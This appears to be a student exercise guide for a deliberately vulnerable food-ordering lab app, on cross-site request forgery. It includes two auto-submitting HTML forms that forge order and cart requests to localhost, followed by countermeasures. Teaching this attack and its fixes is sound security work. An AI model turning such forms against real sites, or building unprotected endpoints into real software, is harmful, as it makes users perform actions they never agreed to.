# 🛡️ CSRF (Cross-Site Request Forgery) Vulnerability Guide

## ❗ Vulnerable Endpoints

- `POST /api/orders/place` — Place an order as the logged-in user
- `POST /api/cart/add` — Add an item to the cart as the logged-in user

These endpoints are intentionally left **without CSRF protection** for educational purposes.

---

## 🚨 How to Exploit (Student Exercise)

### 1. Log in to VulnEats as a user in one browser tab.

### 2. In another tab, open a simple HTML file with the following code:

**To place an order (CSRF attack on `/api/orders/place`):**
```html
<!-- Save as csrf_place_order.html and open in your browser -->
<form action="http://localhost:5001/api/orders/place" method="POST" enctype="application/json">
  <input type="hidden" name="restaurant_id" value="1">
  <input type="submit" value="Place Order!">
</form>
<script>
  document.forms[0].submit();
</script>
```

**To add an item to the cart (CSRF attack on `/api/cart/add`):**
```html
<!-- Save as csrf_add_cart.html and open in your browser -->
<form action="http://localhost:5001/api/cart/add" method="POST" enctype="application/json">
  <input type="hidden" name="menu_item_id" value="1">
  <input type="hidden" name="quantity" value="2">
  <input type="submit" value="Add to Cart!">
</form>
<script>
  document.forms[0].submit();
</script>
```

### 3. Observe:
- The order is placed or the cart is modified without your consent, simply by visiting a malicious page while logged in.

---

## 🛡️ Countermeasures (How to Fix CSRF)

To secure these endpoints in a real-world application, implement one or more of the following:

1. **CSRF Tokens**
   - Generate a unique token for each user session.
   - Require this token to be included in every state-changing request (e.g., as a header or form field).
   - Validate the token server-side before processing the request.

2. **SameSite Cookies**
   - Set session cookies with `SameSite=Strict` or `SameSite=Lax` to prevent them from being sent with cross-site requests.

3. **Check Origin/Referer Headers**
   - Verify that the `Origin` or `Referer` header matches your site’s domain for sensitive requests.

4. **CORS Restrictions**
   - Do not allow cross-origin requests with credentials unless absolutely necessary.

**Example (Flask-WTF CSRF Protection):**
```python
from flask_wtf.csrf import CSRFProtect
csrf = CSRFProtect(app)
```
Or, for API endpoints, require a custom header (e.g., `X-CSRF-Token`) and validate it manually.

---

## 📚 References

- [OWASP CSRF Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross-Site_Request_Forgery_Prevention_Cheat_Sheet.html)
- [Flask-WTF CSRF Docs](https://flask-wtf.readthedocs.io/en/stable/csrf.html)

---

**Remember:** These vulnerabilities are for learning only. Never leave CSRF vulnerabilities in production code!
